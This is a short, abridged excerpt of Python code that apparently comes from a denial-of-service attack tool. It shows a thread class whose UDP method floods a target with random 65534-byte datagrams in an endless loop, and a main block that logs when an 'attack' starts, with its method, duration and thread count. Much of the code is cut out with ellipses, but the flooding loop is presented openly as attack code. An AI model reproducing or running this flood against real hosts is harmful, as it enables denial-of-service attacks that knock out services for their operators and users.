...
class Layer4(Thread):
    ...
    def UDP(self) -> None:
        ...
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(65534, 577), self._target):
                continue
        Tools.safe_close(s)
...
if __name__ == '__main__':
      with suppress(KeyboardInterrupt):
          with suppress(IndexError):
              ...
              logger.info(
                  f"{bcolors.FAIL}Attack Started to{bcolors.OKCYAN} %s{bcolors.FAIL} with{bcolors.OKCYAN} %s{bcolors.FAIL} method for{bcolors.OKCYAN} %s{bcolors.FAIL} seconds, threads:{bcolors.OKCYAN} %d{bcolors.FAIL}!{bcolors.RESET}"
